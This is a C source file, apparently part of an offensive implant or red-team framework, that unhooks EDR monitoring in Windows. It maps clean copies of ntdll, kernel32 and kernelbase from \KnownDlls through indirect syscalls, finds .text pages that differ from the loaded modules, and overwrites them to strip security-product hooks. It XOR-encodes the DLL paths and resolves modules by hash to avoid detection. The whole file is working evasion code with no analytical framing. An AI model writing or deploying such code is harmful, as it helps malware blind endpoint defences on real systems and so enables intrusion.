#include "Unhooker.h"
#include "Common.h"
#include "ApiHashing.h"
#include "../Engine/NtApi.h"
#include "../Engine/OpsecFlags.h"
#include "Syscalls.h"

/* XOR key 0xAA — same as in Syscalls.c for consistency.
 * Encoded paths: \KnownDlls\ntdll.dll (20 bytes),
 *                \KnownDlls\kernel32.dll (23 bytes),
 *                \KnownDlls\kernelbase.dll (25 bytes). */
static const BYTE kEncNtdll[] = {
    0xF6,0xE1,0xC4,0xC5,0xDD,0xC4,0xEE,0xC6,0xC6,0xD9,
    0xF6,0xC4,0xDE,0xCE,0xC6,0xC6,0x84,0xCE,0xC6,0xC6
};
static const BYTE kEncKernel32[] = {
    0xF6,0xE1,0xC4,0xC5,0xDD,0xC4,0xEE,0xC6,0xC6,0xD9,
    0xF6,0xC1,0xCF,0xD8,0xC4,0xCF,0xC6,0x99,0x98,0x84,
    0xCE,0xC6,0xC6
};
static const BYTE kEncKernelbase[] = {
    0xF6,0xE1,0xC4,0xC5,0xDD,0xC4,0xEE,0xC6,0xC6,0xD9,
    0xF6,0xC1,0xCF,0xD8,0xC4,0xCF,0xC6,0xC8,0xCB,0xD9,
    0xCF,0x84,0xCE,0xC6,0xC6
};

/* Maps a section from \KnownDlls\ using HellsHall (clean trampoline).
 * Returns the base of the mapping or NULL on error. */
static PVOID MapKnownDll(const BYTE* enc, int len, BYTE xorKey) {
    wchar_t wPath[32];
    for (int i = 0; i < len; i++) wPath[i] = (wchar_t)(enc[i] ^ xorKey);
    wPath[len] = L'\0';

    UNICODE_STRING us;
    us.Length = (USHORT)(len * sizeof(wchar_t));
    us.MaximumLength = us.Length + sizeof(wchar_t);
    us.Buffer = wPath;

    /* OBJECT_ATTRIBUTES — same definition as in Syscalls.c (found in Structs.h/Syscalls.c).
     * Inline init, to avoid including external header. */
    OBJECT_ATTRIBUTES oa;
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.RootDirectory = NULL;
    oa.ObjectName = &us;
    oa.Attributes = 0x40; /* OBJ_CASE_INSENSITIVE */
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hSection = NULL;
    NTSTATUS st = pNtOpenSection(&hSection, SECTION_MAP_READ, &oa);
    if (st < 0 || !hSection) return NULL;

    PVOID  pBase = NULL;
    SIZE_T viewSize = 0;
    st = pNtMapViewOfSection(hSection, (HANDLE)-1, &pBase,
        0, 0, NULL, &viewSize, 1 /*ViewShare*/,
        0, PAGE_READONLY);
    pNtClose(hSection);
    if (st < 0 || !pBase) return NULL;
    return pBase;
}

/* Compares page by page the .text section of the hooked vs clean module.
 * If different: NtProtect RX→RW, memcpy from clean, NtProtect back to RX. */
static void UnhookModule(PVOID hookedBase, PVOID cleanBase) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hookedBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hookedBase + pDos->e_lfanew);

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++, pSec++) {
        if (custom_memcmp((char*)pSec->Name, ".text", 5) != 0) continue;

        PBYTE  pHook = (PBYTE)hookedBase + pSec->VirtualAddress;
        PBYTE  pClean = (PBYTE)cleanBase + pSec->VirtualAddress;
        DWORD  sSize = pSec->Misc.VirtualSize;
        DWORD  pages = (sSize + 0xFFF) >> 12;

        for (DWORD p = 0; p < pages; p++) {
            PBYTE pHPage = pHook + (SIZE_T)p * 0x1000;
            PBYTE pCPage = pClean + (SIZE_T)p * 0x1000;
            DWORD pageBytes = (p == pages - 1 && (sSize & 0xFFF))
                ? (sSize & 0xFFF) : 0x1000;

            if (custom_memcmp(pHPage, pCPage, pageBytes) == 0) continue;

            /* Page differs — EDR installed inline hook. */
            PVOID  pBase = pHPage;
            SIZE_T sz = 0x1000;
            ULONG  old = 0;
            if (pNtProtectVirtualMemory((HANDLE)-1, &pBase, &sz,
                PAGE_EXECUTE_READWRITE, &old) < 0) continue;
            custom_memcpy(pHPage, pCPage, pageBytes);
            pNtProtectVirtualMemory((HANDLE)-1, &pBase, &sz,
                PAGE_EXECUTE_READ, &old);
        }
        break; /* .text found — end */
    }
}

BOOL Unhook_RestoreAll(void) {
    /* Mapuj czyste kopie */
    PVOID pCNtdll = MapKnownDll(kEncNtdll, 20, 0xAA);
    PVOID pCK32 = MapKnownDll(kEncKernel32, 23, 0xAA);
    PVOID pCKbase = MapKnownDll(kEncKernelbase, 25, 0xAA);

    /* Base addresses in process — PEB walk through GetModuleHandleH */
    PVOID pHNtdll = GetModuleHandleH(g_Hash_ntdll);
    PVOID pHK32 = GetModuleHandleH(g_Hash_kernel32);
    PVOID pHKbase = GetModuleHandleH(g_Hash_kernelbase);

    if (pCNtdll && pHNtdll) { UnhookModule(pHNtdll, pCNtdll);  pNtUnmapViewOfSection((HANDLE)-1, pCNtdll); }
    if (pCK32 && pHK32) { UnhookModule(pHK32, pCK32);    pNtUnmapViewOfSection((HANDLE)-1, pCK32); }
    if (pCKbase && pHKbase) { UnhookModule(pHKbase, pCKbase);  pNtUnmapViewOfSection((HANDLE)-1, pCKbase); }

    return TRUE;
}